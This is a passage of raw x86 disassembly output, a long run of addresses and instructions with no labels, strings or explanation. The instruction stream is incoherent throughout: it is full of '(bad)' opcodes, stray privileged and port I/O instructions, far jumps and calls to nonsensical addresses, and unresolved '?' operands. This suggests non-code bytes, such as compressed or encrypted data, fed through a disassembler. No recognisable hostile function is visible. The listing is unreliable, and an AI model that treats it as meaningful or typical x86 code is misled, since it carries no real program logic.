  40b86d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b86e:	mov    ebp,0xd86aeda0
  40b873:	mov    ds:0xc151e448,al
  40b878:	mov    eax,ds:0x67c15cc4
  40b87d:	xchg   BYTE PTR [ecx+0x40861e72],cl
  40b883:	jno    0x40b8bb
  40b885:	xchg   ebx,eax
  40b886:	pop    esp
  40b887:	xor    BYTE PTR [edx],al
  40b889:	(bad)  
  40b88a:	retf   0xf824
  40b88d:	es pop esp
  40b88f:	inc    ebx
  40b890:	adc    eax,0xf5e52419
  40b895:	popa   
  40b896:	push   ds
  40b897:	sti    
  40b898:	test   eax,0xd4d2a0c0
  40b89d:	hlt    
  40b89e:	cs sub bl,bl
  40b8a1:	fisubr DWORD PTR [esi]
  40b8a3:	addr16 pop esi
  40b8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8a6:	out    0x36,al
  40b8a8:	shl    al,cl
  40b8aa:	fcom   QWORD PTR [ebp-0x72c61439]
  40b8b0:	xchg   BYTE PTR [edx],cl
  40b8b2:	sub    BYTE PTR [edx],0xf3
  40b8b5:	loopne 0x40b8c0
  40b8b7:	daa    
  40b8b8:	test   eax,0xf83773fc
  40b8bd:	inc    esp
  40b8be:	inc    esi
  40b8bf:	mov    ebp,0x4bc68d6f
  40b8c4:	add    BYTE PTR [esi],0x5a
  40b8c7:	ret    
  40b8c8:	out    0x48,al
  40b8ca:	or     ebp,DWORD PTR [ecx+0x37]
  40b8cd:	outs   dx,BYTE PTR ds:[esi]
  40b8ce:	mov    ds:0xafe09aba,al
  40b8d3:	nop    DWORD PTR [eax+0x1223328f]
  40b8da:	xchg   DWORD PTR [ebx*2+0x45cf309c],eax
  40b8e1:	xor    DWORD PTR [eax+0x8dfdd1f],esi
  40b8e7:	inc    esp
  40b8e8:	scas   eax,DWORD PTR es:[edi]
  40b8e9:	jnp    0x40b936
  40b8eb:	mov    ds:0x545cd0a4,al
  40b8f0:	jmp    0x8af3:0x9f1eeda6
  40b8f7:	and    al,0xa5
  40b8f9:	enter  0xd4f,0x91
  40b8fd:	inc    eax
  40b8fe:	iret   
  40b8ff:	cmp    al,0x71
  40b901:	test   eax,0x2d792aee
  40b906:	mov    eax,0x38761383
  40b90b:	pushf  
  40b90c:	pop    ebx
  40b90d:	pop    ecx
  40b90e:	sahf   
  40b90f:	icebp  
  40b910:	fcomp  DWORD PTR [ecx-0x6262b3d9]
  40b916:	mov    ch,0x58
  40b918:	jl     0x40b958
  40b91a:	sub    dh,BYTE PTR [edi+0x10766377]
  40b920:	aas    
  40b921:	cli    
  40b922:	dec    ecx
  40b923:	dec    esi
  40b924:	pop    ss
  40b925:	loopne 0x40b95a
  40b927:	jge    0x40b8f0
  40b929:	lods   al,BYTE PTR ds:[esi]
  40b92a:	xor    eax,0x8a48affd
  40b92f:	in     eax,0xb1
  40b931:	pop    esi
  40b932:	add    eax,0xb46b5a5b
  40b937:	das    
  40b938:	repz xlat BYTE PTR ds:[ebx]
  40b93a:	mov    eax,ds:0xe3ccc412
  40b93f:	push   0xfffffff5
  40b941:	dec    esp
  40b942:	(bad)  
  40b943:	xlat   BYTE PTR ds:[ebx]
  40b944:	pop    ds
  40b945:	dec    edi
  40b946:	or     bl,BYTE PTR [eax]
  40b948:	jnp    0x40b94a
  40b94a:	and    DWORD PTR [ebp-0x7fed5bc9],ebx
  40b950:	jno    0x40b985
  40b952:	ja     0x40b955
  40b954:	push   esp
  40b955:	jbe    0x40b98d
  40b957:	jbe    0x40b911
  40b959:	jg     0x40b907
  40b95b:	cmc    
  40b95c:	pop    es
  40b95d:	jp     0x40b93f
  40b95f:	xchg   edi,eax
  40b960:	test   dl,cl
  40b962:	mov    ah,0xfa
  40b964:	mov    ah,0x4c
  40b966:	pop    DWORD PTR [ebx]
  40b968:	jne    0x40b9c7
  40b96a:	cs sti 
  40b96c:	das    
  40b96d:	iret   
  40b96e:	cld    
  40b96f:	add    DWORD PTR [eax],edx
  40b971:	test   eax,0x512e371b
  40b976:	pushf  
  40b977:	dec    edx
  40b978:	addr16 mov cl,0x45
  40b97b:	and    BYTE PTR ds:0x1f15f454,ah
  40b981:	leave  
  40b982:	pop    ss
  40b983:	inc    esi
  40b984:	mov    cl,0xaf
  40b986:	repnz (bad) 
  40b988:	out    0x12,al
  40b98a:	inc    esi
  40b98b:	dec    ebp
  40b98c:	in     eax,0xcb
  40b98e:	xchg   bh,dh
  40b990:	lahf   
  40b991:	fcom   QWORD PTR gs:[ecx+0x70]
  40b995:	mov    al,0xc9
  40b997:	mov    cl,BYTE PTR [edi-0x18]
  40b99a:	pop    ss
  40b99b:	cmp    BYTE PTR [eax-0x3df7955a],0xf2
  40b9a2:	repz (bad) 
  40b9a4:	mov    dl,0x1f
  40b9a6:	div    BYTE PTR [edi]
  40b9a8:	sbb    cl,BYTE PTR [ebp+0x63]
  40b9ab:	test   BYTE PTR ds:[edx-0x56fc8a80],bh
  40b9b2:	pop    es
  40b9b3:	pusha  
  40b9b4:	sub    edx,ebx
  40b9b6:	xchg   edx,eax
  40b9b7:	test   DWORD PTR [ebx-0x6b],edx
  40b9ba:	adc    edx,DWORD PTR [ecx+ebx*4+0x2e]
  40b9be:	sub    eax,0xf6f547e9
  40b9c3:	jbe    0x40b99b
  40b9c5:	pop    ss
  40b9c6:	jmp    0xd80bbf91
  40b9cb:	cwde   
  40b9cc:	popf   
  40b9cd:	call   0x870c8db5
  40b9d2:	jg     0x40b9a0
  40b9d4:	repz push ecx
  40b9d6:	repz sbb dl,BYTE PTR ds:0xc9f2ef67
  40b9dd:	add    bl,BYTE PTR ds:0xa543dd1b
  40b9e3:	neg    DWORD PTR [edi]
  40b9e5:	ret    0x22ac
  40b9e8:	sub    DWORD PTR [eax+0x2a],ecx
  40b9eb:	jns    0x40ba66
  40b9ed:	or     eax,0xf0bd4af2
  40b9f2:	clc    
  40b9f3:	lea    esp,[bp-0x483f]
  40b9f8:	in     eax,dx
  40b9f9:	scas   al,BYTE PTR es:[edi]
  40b9fa:	push   0xffffffb8
  40b9fc:	mov    eax,?
  40b9fe:	adc    BYTE PTR [edi+esi*8],dh
  40ba01:	repnz into 
  40ba03:	push   edx
  40ba04:	sub    DWORD PTR [ecx],edi
  40ba06:	(bad)  
  40ba07:	aam    0xab
  40ba09:	mov    dl,BYTE PTR [eax]
  40ba0b:	loop   0x40b9a0
  40ba0d:	nop
  40ba0e:	sbb    edx,edi
  40ba10:	popa   
  40ba11:	adc    ebx,DWORD PTR [edi+0x5d]
  40ba14:	nop
  40ba15:	je     0x40ba75
  40ba17:	enter  0xb0cd,0xc8
  40ba1b:	cmp    ebp,DWORD PTR [ebp-0x30]
  40ba1e:	hlt    
  40ba1f:	in     al,dx
  40ba20:	cs adc al,0x75
  40ba23:	je     0x40ba61
  40ba25:	inc    esi
  40ba26:	das    
  40ba27:	jnp    0x40b9f3
  40ba29:	dec    esi
  40ba2a:	adc    DWORD PTR [esi+0x13edb479],0x65
  40ba31:	mov    dl,0xc
  40ba33:	(bad)  
  40ba34:	mov    ?,esp
  40ba36:	sub    DWORD PTR [edi-0x1],0x68
  40ba3a:	test   eax,0x7ea3324c
  40ba3f:	mov    esi,0xe81e0303
  40ba44:	(bad)  
  40ba45:	push   ebp
  40ba46:	(bad)  
  40ba48:	jp     0x40ba3a
  40ba4a:	push   cs
  40ba4b:	loop   0x40ba28
  40ba4d:	mov    al,0x92
  40ba4f:	mov    cs,WORD PTR [ecx+0x5d07058f]
  40ba55:	lea    ebp,[edi]
  40ba57:	lock dec ebp
  40ba59:	inc    esi
  40ba5a:	add    ch,BYTE PTR [edx]
  40ba5c:	pop    ebp
  40ba5d:	mov    al,ds:0x6cc028f3
  40ba62:	idiv   BYTE PTR [ecx+0x67647764]
  40ba68:	aam    0xcb
  40ba6a:	outs   dx,BYTE PTR ds:[esi]
  40ba6b:	test   esi,eax
  40ba6d:	ds repnz in eax,0xb8
  40ba71:	mov    ds:0x9b1e180b,al
  40ba76:	mov    al,0x86
  40ba78:	pop    es
  40ba79:	repz call 0x4fc5:0x862e2fcf
  40ba81:	and    edx,DWORD PTR [edx+0x13]
  40ba84:	dec    ebp
  40ba85:	and    eax,ebp
  40ba87:	jmp    DWORD PTR [ebx-0x1a5c5ade]
  40ba8d:	loope  0x40ba26
  40ba8f:	or     eax,0x11c26fa6
  40ba94:	data16 loopne 0x40ba55
  40ba97:	fcomp  QWORD PTR [eax]
  40ba99:	sub    DWORD PTR [edi-0x13],0xee144981
  40baa0:	lods   eax,DWORD PTR ds:[esi]
  40baa1:	retf   
  40baa2:	(bad)  
  40baa3:	cmp    al,bl
  40baa5:	cld    
  40baa6:	pop    ss
  40baa7:	jb     0x40bab5
  40baa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40baaa:	mov    edx,0x2a4db0db
  40baaf:	dec    ebx
  40bab0:	mov    ah,0x79
  40bab2:	sub    al,0x5f
  40bab4:	or     bh,BYTE PTR [eax+0x6e]
  40bab7:	add    ah,BYTE PTR [edi+0x4425faba]
  40babd:	mov    esi,0x5a4401f8
  40bac2:	je     0x40ba49
  40bac4:	fbstp  TBYTE PTR [edx-0x3f67b663]
  40baca:	push   cs
  40bacb:	jo     0x40ba8f
  40bacd:	out    dx,al
  40bace:	enter  0x192,0x25
  40bad2:	lea    eax,[ecx+0x7f]
  40bad5:	(bad)  
  40bad7:	push   esi
  40bad8:	pop    ecx
  40bad9:	ret    0x5066
  40badc:	push   cs
  40badd:	mov    dl,0x3b
  40badf:	and    eax,0x747ad456
  40bae4:	and    cl,BYTE PTR [eax]
  40bae6:	(bad)  [esi+0xa]
  40bae9:	aaa    
  40baea:	jae    0x40bb13
  40baec:	sub    eax,0xd35cd034
  40baf1:	mov    esi,0x10ae193d
  40baf6:	mov    dh,0xfb
  40baf8:	fdivr  st,st(1)
  40bafa:	rcl    cl,1
  40bafc:	mov    dh,0x5a
  40bafe:	push   ss
  40baff:	test   eax,0x4c9123f9
  40bb04:	xor    eax,0xc93c40bd
  40bb09:	add    eax,0x7029db0
  40bb0e:	in     eax,dx
  40bb0f:	mov    al,ds:0x73a1dc64
  40bb14:	es mov ah,0xd
  40bb17:	retfw  0xac8b
  40bb1b:	pop    ebx
  40bb1c:	pusha  
  40bb1d:	inc    esi
  40bb1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb1f:	(bad)  
  40bb20:	and    BYTE PTR [edi+0x6b],ah
  40bb23:	inc    esi
  40bb24:	and    BYTE PTR [ebx+0x2ec84d92],bh
  40bb2a:	sbb    ebx,DWORD PTR [edi+0x287cd018]
  40bb30:	mov    cl,0x33
  40bb32:	jle    0x40bb02
  40bb34:	mov    bh,0x32
  40bb36:	popa   
  40bb37:	jle    0x40bb38
  40bb39:	jle    0x40bb17
  40bb3b:	loop   0x40bb12
  40bb3d:	jb     0x40bb6a
  40bb3f:	sar    DWORD PTR [eax+ebp*2-0x512274b3],0xbd
  40bb47:	pop    edx
  40bb48:	xor    ecx,DWORD PTR [edi+0x649ecc30]
  40bb4e:	dec    edx
  40bb4f:	mov    esp,0x5a5b6ee1
  40bb54:	sbb    DWORD PTR [ebp+eax*8-0x1a],ebx
  40bb58:	iret   
  40bb59:	mov    bl,0x42
  40bb5b:	jns    0x40bbb8
  40bb5d:	sub    ecx,eax
  40bb5f:	pop    esi
  40bb60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb61:	xchg   ebx,eax
  40bb62:	stc    
  40bb63:	xchg   edi,eax
  40bb64:	push   ecx
  40bb65:	mov    ch,0xe0
  40bb67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb68:	sub    BYTE PTR [edx+0x77c6c7e8],0xa0
  40bb6f:	pop    edx
  40bb70:	push   0xe2b067ff
  40bb75:	mov    esp,0x5b3db59e
  40bb7a:	(bad)  
  40bb7b:	std    
  40bb7c:	jle    0x40bbcc
  40bb7e:	or     al,dh
  40bb80:	pop    eax
  40bb81:	and    BYTE PTR [eax-0x5d],bl
  40bb84:	or     DWORD PTR [ebx+ebp*1],0x39bab17e
  40bb8b:	mov    dl,0xde
  40bb8d:	sub    ecx,DWORD PTR [esi]
  40bb8f:	ror    DWORD PTR [eax],0xaa
  40bb92:	xchg   esi,eax
  40bb93:	dec    esi
  40bb94:	push   esp
  40bb95:	xchg   esi,eax
  40bb96:	xchg   DWORD PTR [edx+esi*1-0x9ef3abb],edi
  40bb9d:	mov    ah,0xc9
  40bb9f:	jmp    0xcb37:0xca685b2a
  40bba6:	and    eax,0xe155a1fa
  40bbab:	ret    0x204c
  40bbae:	out    dx,al
  40bbaf:	fcom   DWORD PTR [ebp+0x5c]
  40bbb2:	fs dec eax
  40bbb4:	aas    
  40bbb5:	in     al,0xf2
  40bbb7:	bound  ebp,QWORD PTR [edx-0x5340f8d0]
  40bbbd:	sub    ebx,0xfa59da8b
  40bbc3:	ret    
  40bbc4:	pop    ds
  40bbc5:	cdq    
  40bbc6:	sbb    al,0xd3
  40bbc8:	in     eax,0xe4
  40bbca:	test   al,0x41
  40bbcc:	push   esi
  40bbcd:	inc    edi
  40bbce:	out    0x71,al
  40bbd0:	and    edx,DWORD PTR [edx+ebx*4+0x7359d5a9]
  40bbd7:	mov    edi,0x6bdea213
  40bbdc:	idiv   BYTE PTR [ebp-0x22]
  40bbdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbe0:	or     al,0xeb
  40bbe2:	xchg   edx,eax
  40bbe3:	rsqrtps xmm6,xmm7
  40bbe6:	js     0x40bb9f
  40bbe8:	jb     0x40bc37
  40bbea:	push   ecx
  40bbeb:	retf   
  40bbec:	sbb    eax,0xb0c4011a
  40bbf1:	(bad)  
  40bbf2:	fdivr  QWORD PTR [edi+0x59]
  40bbf5:	adc    al,0x5c
  40bbf7:	lock cdq 
  40bbf9:	pop    ss
  40bbfa:	xlat   BYTE PTR ds:[ebx]
  40bbfb:	cmc    
  40bbfc:	loop   0x40bc27
  40bbfe:	stos   DWORD PTR es:[edi],eax
  40bbff:	(bad)  
  40bc00:	loopne 0x40bbd3
  40bc02:	in     al,0x35
  40bc04:	popa   
  40bc05:	sti    
  40bc06:	xchg   esi,eax
  40bc07:	cli    
  40bc08:	into   
  40bc09:	cld    
  40bc0a:	aam    0xf6
  40bc0c:	xchg   esi,eax
  40bc0d:	mov    al,0xb5
  40bc0f:	xchg   edx,eax
  40bc10:	xor    ebp,DWORD PTR [ecx]
  40bc12:	das    
  40bc13:	add    BYTE PTR [eax-0x62586179],al
  40bc19:	aam    0x3a
  40bc1b:	loope  0x40bbfb
  40bc1d:	xor    al,0x11
  40bc1f:	mov    ebp,DWORD PTR [esi-0x33aaf52c]
  40bc25:	mov    al,ds:0x1086c9a4
  40bc2a:	sub    edi,DWORD PTR [esi-0x5b790581]
  40bc30:	inc    ecx
  40bc31:	sub    al,0x61
  40bc33:	jg     0x40bc3a
  40bc35:	mov    eax,0xcd5c88dd
  40bc3a:	adc    eax,0x52ff8cb2
  40bc3f:	data16 jo 0x40bbf2
  40bc42:	cwde   
  40bc43:	mov    WORD PTR [ecx-0xc],es
  40bc46:	out    dx,al
  40bc47:	test   al,0x17
  40bc49:	aaa    
  40bc4a:	pushf  
  40bc4b:	cmp    al,0x6d
  40bc4d:	mov    bl,dl
  40bc4f:	mov    ebx,ebp
  40bc51:	pop    ebp
  40bc52:	test   BYTE PTR [ebx-0xb],cl
  40bc55:	sub    BYTE PTR [edi+0x63ca4e6d],dh
  40bc5b:	jmp    0x85323fca
  40bc60:	or     bl,BYTE PTR [edx-0x12d073d]
  40bc66:	jg     0x40bc78
  40bc68:	cmp    ebp,ecx
  40bc6a:	xchg   esp,eax
  40bc6b:	add    BYTE PTR [eax-0x77576095],dh
  40bc71:	fnstcw WORD PTR [edi+0x65]
  40bc74:	into   
  40bc75:	mov    al,0xb7
  40bc77:	fyl2x  
  40bc79:	sbb    BYTE PTR [edi-0x40],bl
  40bc7c:	into   
  40bc7d:	mov    bh,0xf4
  40bc7f:	sbb    BYTE PTR ds:0x1e48d629,ah
  40bc85:	pop    ecx
  40bc86:	aam    0x90
  40bc88:	sbb    esp,DWORD PTR [ebp+ecx*4+0x16]
  40bc8c:	mov    ch,0x6d
  40bc8e:	pop    esi
  40bc8f:	xchg   edi,eax
  40bc90:	and    BYTE PTR [ebx-0x4b0c115c],bl
  40bc96:	mov    edi,0x5176b2df
  40bc9b:	enter  0x5eb6,0x6c
  40bc9f:	cmp    esi,ebp
  40bca1:	cmp    esp,DWORD PTR [ebx+0x6edc7921]
  40bca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bca8:	(bad)  
  40bca9:	pop    edx
  40bcaa:	push   0x54e49157
  40bcaf:	retf   
  40bcb0:	(bad)  
  40bcb1:	int    0x59
  40bcb3:	pusha  
  40bcb4:	mov    esi,0xdb699f62
  40bcb9:	add    eax,0xff6414d1
  40bcbe:	mov    dl,0x51
  40bcc0:	sbb    al,0x77
  40bcc2:	mov    bh,0x31
  40bcc4:	or     dl,BYTE PTR [ebx+0x3b02fd03]
  40bcca:	push   dx
  40bccc:	sahf   
  40bccd:	sbb    ch,ah
  40bccf:	sti    
  40bcd0:	shl    DWORD PTR [eax],1
  40bcd2:	mov    ebx,esp
  40bcd4:	sub    bh,BYTE PTR [eax-0x6e]
  40bcd7:	int    0x5f
  40bcd9:	cmp    ecx,DWORD PTR [edx-0x5b]
  40bcdc:	fadd   st(2),st
  40bcde:	aad    0x25
  40bce0:	mov    cs,WORD PTR [ebx+0x1fcc12d7]
  40bce6:	es xor edi,esp
  40bce9:	lea    esi,[ebx+0x68]
  40bcec:	int    0x9c
  40bcee:	loope  0x40bca1
  40bcf0:	cs jp  0x40bd48
  40bcf3:	mov    bh,0xa7
  40bcf5:	rcr    eax,0xd
  40bcf8:	or     BYTE PTR [ebp+0x66cf58c4],0xd2
  40bcff:	push   ecx
  40bd00:	outs   dx,BYTE PTR ds:[esi]
  40bd01:	out    0x6c,eax
  40bd03:	add    ax,0x4131
  40bd07:	cmp    esi,DWORD PTR [ebx-0x3]
  40bd0a:	imul   ebp,DWORD PTR [eax],0x829cccb5
  40bd10:	(bad)  
  40bd11:	push   ebx
  40bd12:	out    dx,eax
  40bd13:	fld    DWORD PTR [edi+ecx*2]
  40bd16:	jmp    0xa27:0x79a4ace5
  40bd1d:	outs   dx,BYTE PTR ds:[esi]
  40bd1e:	or     al,ch
  40bd20:	xor    al,0x51
  40bd22:	dec    edi
  40bd23:	sar    dl,1
  40bd25:	fcom   QWORD PTR [edx]
  40bd27:	fs and al,0x4f
  40bd2a:	shl    DWORD PTR [edx+0x53],0xae
  40bd2e:	push   cs
  40bd2f:	retf   
  40bd30:	push   edx
  40bd31:	push   bp
  40bd33:	mov    DWORD PTR [ebx],ebx
  40bd35:	mov    esp,DWORD PTR [edx-0x29bcf784]
  40bd3b:	rcr    BYTE PTR [edi],cl
  40bd3d:	rep lods eax,DWORD PTR ds:[esi]
  40bd3f:	repnz iret 
  40bd41:	sub    DWORD PTR [edi],edi
  40bd43:	sub    bh,bl
  40bd45:	(bad)  
  40bd46:	jge    0x40bce0
  40bd48:	mov    cl,0x2d
  40bd4a:	outs   dx,BYTE PTR ds:[esi]
  40bd4b:	sar    DWORD PTR [edi+0x52],1
  40bd4e:	mov    edi,DWORD PTR [edi-0x1a917cfc]
  40bd54:	xchg   esp,eax
  40bd55:	mov    ebp,edi
  40bd57:	add    bh,bl
  40bd59:	call   0x3dc953cf
  40bd5e:	or     edx,DWORD PTR [edi-0x3a]
  40bd61:	sahf   
  40bd62:	repz jno 0x40bdbc
  40bd65:	not    DWORD PTR [ebx]
  40bd67:	sub    BYTE PTR [ebx+0x6b45fa75],bh
  40bd6d:	and    eax,0x3616f6a1
  40bd72:	retf   0xb9d4
  40bd75:	jbe    0x40bda5
  40bd77:	ja     0x40bded
  40bd79:	jo     0x40bd72
  40bd7b:	std    
  40bd7c:	fidiv  DWORD PTR [eax+ecx*1+0x6d]
  40bd80:	bound  esp,QWORD PTR [eax]
  40bd82:	idiv   BYTE PTR [edx+0xcec1c46]
  40bd88:	test   eax,0xdaf73878
  40bd8d:	cmc    
  40bd8e:	cdq    
  40bd8f:	in     eax,dx
  40bd90:	int3   
  40bd91:	aad    0x85
  40bd93:	pop    ds
  40bd94:	stos   BYTE PTR es:[edi],al
  40bd95:	xlat   BYTE PTR ds:[ebx]
  40bd96:	mov    eax,DWORD PTR [ecx]
  40bd98:	std    
  40bd99:	adc    DWORD PTR [edx],edi
  40bd9b:	jg     0x40be0f
  40bd9d:	mov    eax,ds:0xbcd42e1
  40bda3:	adc    ebx,esi
  40bda5:	add    al,0xdb
  40bda7:	adc    DWORD PTR [ebp+edx*2+0x1a],0xffffff87
  40bdac:	xchg   esi,eax
  40bdad:	data16 xchg BYTE PTR [eax+edx*2],ah
  40bdb1:	rcl    ebp,cl
  40bdb3:	add    esi,edi
  40bdb5:	mov    WORD PTR [eax-0xb],ss
  40bdb8:	aad    0xd7
  40bdba:	jl     0x40bd8d
  40bdbc:	out    dx,eax
  40bdbd:	sbb    ecx,esi
  40bdbf:	cld    
  40bdc0:	push   esp
  40bdc1:	(bad)  
  40bdc3:	xchg   BYTE PTR [edx],dl
  40bdc5:	jmp    0x40be0a
  40bdc7:	and    dh,0x43
  40bdca:	add    esi,eax
  40bdcc:	xchg   edi,eax
  40bdcd:	add    al,0xb1
  40bdcf:	cwde   
  40bdd0:	dec    ebx
  40bdd1:	cmc    
  40bdd2:	mov    edx,0xa4895f79
  40bdd7:	push   eax
  40bdd8:	shr    DWORD PTR [eax+0x4c],0x31
  40bddc:	fwait
  40bddd:	jns    0x40bd95
  40bddf:	rol    esp,cl
  40bde1:	scas   al,BYTE PTR es:[edi]
  40bde2:	outs   dx,DWORD PTR ds:[esi]
  40bde3:	fs inc edi
  40bde5:	cs mov edi,0xe1958a0c
  40bdeb:	or     bl,BYTE PTR [esi+0x411c465d]
  40bdf1:	pop    ebx
  40bdf2:	and    BYTE PTR [ebp+0x6d0a0331],cl
  40bdf8:	dec    esp
  40bdf9:	sub    eax,0xf77021a
  40bdfe:	jecxz  0x40bde8
  40be00:	hlt    
  40be01:	jge    0x40be57
  40be03:	out    0x9a,al
  40be05:	pop    ecx
  40be06:	push   ss
  40be07:	pop    esi
  40be08:	add    eax,0x1f0306b2
  40be0d:	icebp  
  40be0e:	adc    al,BYTE PTR [eax+ecx*2-0x2b]
  40be12:	test   DWORD PTR ds:0xd47c29b3,0x78ac9155
  40be1c:	aam    0xc6
  40be1e:	adc    eax,0xd676bb22
  40be23:	mov    ecx,ebx
  40be25:	gs es adc al,0x92
  40be29:	aas    
  40be2a:	inc    BYTE PTR [edi+0x5c76c32a]
  40be30:	shr    DWORD PTR [esi],cl
  40be32:	ror    ah,0x31
  40be35:	call   0xfdb:0x77bd8ef8
  40be3c:	pop    eax
  40be3d:	aas    
  40be3e:	push   es
  40be3f:	pop    ebx
  40be40:	inc    edi
  40be41:	push   eax
  40be42:	data16 mov bl,0x7e
  40be45:	xlat   BYTE PTR ds:[ebx]
  40be46:	enter  0xb643,0xcd
  40be4a:	in     al,dx
  40be4b:	mov    dl,0xef
  40be4d:	daa    
  40be4e:	dec    eax
  40be4f:	xor    eax,0xde4fe950
  40be54:	loope  0x40be4e
  40be56:	mov    esp,ebp
  40be58:	scas   eax,DWORD PTR es:[edi]
  40be59:	(bad)  
  40be5a:	pop    ds
  40be5b:	xor    al,0x2f
  40be5d:	(bad)  
  40be5e:	repz test eax,0xb0d04835
  40be64:	sub    DWORD PTR [eax],esi
  40be66:	fstp   DWORD PTR [edx+0x28]
  40be69:	in     al,dx
  40be6a:	xchg   ecx,eax
  40be6b:	add    al,0x30
  40be6d:	in     al,0xe6
  40be6f:	adc    eax,0x1b
  40be72:	or     ebx,DWORD PTR [edi]
  40be74:	aaa    
  40be75:	mov    al,0x93
  40be77:	xor    eax,0xa7406e58
  40be7c:	sbb    DWORD PTR [ebp-0x3e37df65],ebx
  40be82:	push   esp
  40be83:	xor    edx,edi
  40be85:	inc    edx
  40be86:	int    0xa7
  40be88:	aad    0x98
  40be8a:	jg     0x40be43
  40be8c:	sub    ebx,eax
  40be8e:	fist   WORD PTR [ecx+0x6a]
  40be91:	pushf  
  40be92:	jo     0x40be51
  40be94:	mov    al,0x4c
  40be96:	cmp    DWORD PTR ds:0xd553b3ce,esp
  40be9c:	ret    0xb3ff
  40be9f:	test   DWORD PTR [edx-0x58],edx
  40bea2:	retf   
  40bea3:	dec    esp
  40bea4:	jns    0x40bf0f
  40bea6:	clc    
  40bea7:	pop    ss
  40bea8:	push   es
  40bea9:	jecxz  0x40be40
  40beab:	hlt    
  40beac:	push   esp
  40bead:	(bad)  
  40beae:	xchg   DWORD PTR [edi+0x3],eax
  40beb1:	pop    ecx
  40beb2:	pop    esp
  40beb3:	xor    DWORD PTR cs:[ebp+0x1f],edx
  40beb7:	sbb    eax,0xc2a21b80
  40bebc:	rcr    dh,0xe6
  40bebf:	stos   DWORD PTR es:[edi],eax
  40bec0:	ja     0x40be70
  40bec2:	and    bh,bh
  40bec4:	xor    esi,DWORD PTR [eax+0x3a375acc]
  40beca:	mov    ah,0x2
  40becc:	add    esi,esi
  40bece:	xchg   ecx,eax
  40becf:	push   edi
  40bed0:	iret   
  40bed1:	mov    DWORD PTR [ebp+0x45],ebx
  40bed4:	adc    bl,BYTE PTR [edi-0x39]
  40bed7:	enter  0x5c6e,0x5f
  40bedb:	dec    eax
  40bedc:	pop    ebx
  40bedd:	adc    ebp,esi
  40bedf:	idiv   BYTE PTR [edx+0x1daf3b4]
  40bee5:	(bad)  
  40bee6:	mov    ecx,0x97676857
  40beeb:	pop    es
  40beec:	jge    0x40bee6
  40beee:	leave  
  40beef:	aas    
  40bef0:	jl     0x40beb5
  40bef2:	xor    dl,BYTE PTR [edx]
  40bef4:	sbb    BYTE PTR [ecx+0x7f6c6303],cl
  40befa:	mov    ecx,DWORD PTR [edi-0x28]
  40befd:	mov    ebx,0x209b86d7
  40bf02:	fdivp  st(2),st
  40bf04:	sbb    al,BYTE PTR [eax-0x4a5ec93]
  40bf0a:	jp     0x40be99
  40bf0c:	xchg   esp,eax
  40bf0d:	(bad)  
  40bf0e:	ins    BYTE PTR es:[edi],dx
  40bf0f:	jle    0x40be9c
  40bf11:	sahf   
  40bf12:	inc    ebp
  40bf13:	mov    ch,0x80
  40bf15:	out    dx,eax
  40bf16:	xchg   esp,eax
  40bf17:	jbe    0x40bef4
  40bf19:	mov    DWORD PTR [edi],ebx
  40bf1b:	hlt    
  40bf1c:	test   BYTE PTR [eax-0xcd9567c],bh
  40bf22:	adc    ah,dh
  40bf24:	sub    ebx,ecx
  40bf26:	test   ebp,0x568040b5
  40bf2c:	and    al,0x5
  40bf2e:	rep stos DWORD PTR es:[edi],eax
  40bf30:	pcmpeqb mm4,QWORD PTR [edx-0x3c468cdb]
  40bf37:	popf   
  40bf38:	dec    edi
  40bf39:	outs   dx,BYTE PTR ds:[esi]
  40bf3a:	pop    eax
  40bf3b:	mov    ecx,0xb59888ee
  40bf40:	(bad)  
  40bf41:	mov    eax,0x22525c05
  40bf46:	pop    ds
  40bf47:	retf   
  40bf48:	mov    esi,0x817e479a
  40bf4d:	jge    0x40bfc7
  40bf4f:	jmp    DWORD PTR [esi-0xe5ceb99]
  40bf55:	dec    ebp
  40bf56:	cmp    ch,dh
  40bf58:	ja     0x40bfa2
  40bf5a:	ficomp WORD PTR [esi+0x3]
  40bf5d:	(bad)  
  40bf5e:	pop    ds
  40bf5f:	hlt    
  40bf60:	ins    DWORD PTR es:[edi],dx
  40bf61:	call   0xf96c1c59
  40bf66:	pop    edi
  40bf67:	mov    eax,ds:0xcd4c693d
  40bf6c:	out    dx,al
  40bf6d:	(bad)  
  40bf6e:	(bad)  
  40bf6f:	dec    esi
  40bf70:	aas    
  40bf71:	adc    BYTE PTR [ecx-0x64],cl
  40bf74:	xchg   esi,eax
  40bf75:	jg     0x40bf6c
  40bf77:	sub    ebp,DWORD PTR [edx]
  40bf79:	pop    ebx
  40bf7a:	test   BYTE PTR [ebx+0x5f8d9140],ah
  40bf80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf81:	stc    
  40bf82:	mov    ah,0xca
  40bf84:	shr    BYTE PTR [edi+0x74819039],cl
  40bf8a:	jle    0x40c003
  40bf8c:	lds    ebp,FWORD PTR [ebx]
  40bf8e:	dec    edx
  40bf8f:	ret    
  40bf90:	push   ecx
  40bf91:	(bad)  
  40bf92:	adc    dh,BYTE PTR [ebx]
  40bf94:	sbb    edi,DWORD PTR [edx-0x36]
  40bf97:	out    dx,eax
  40bf98:	cwde   
  40bf99:	sbb    ch,BYTE PTR ds:0xa47f08aa
  40bf9f:	dec    esi
  40bfa0:	push   cs
  40bfa1:	push   ds
  40bfa2:	xor    ebx,DWORD PTR [ecx+0x4f]
  40bfa5:	clc    
  40bfa6:	mov    edi,0x6d3cf372
  40bfab:	ficom  WORD PTR [esi-0x5e1d4eef]
  40bfb1:	shl    BYTE PTR [esi+0x6e8dbcb0],cl
  40bfb7:	lds    edi,FWORD PTR [edx]
  40bfb9:	shl    BYTE PTR [edx],1
  40bfbb:	inc    ebp
  40bfbc:	or     bl,cl
  40bfbe:	inc    ecx
  40bfbf:	jge    0x40bf4e
  40bfc1:	mov    dh,0x8c
  40bfc3:	push   esp
  40bfc4:	mov    esi,0x8d34d832
  40bfc9:	mov    al,ds:0xe3ec5344
  40bfce:	or     BYTE PTR [bx+di+0x6706],0xe1
  40bfd4:	xchg   DWORD PTR [esi],esi
  40bfd6:	(bad)  
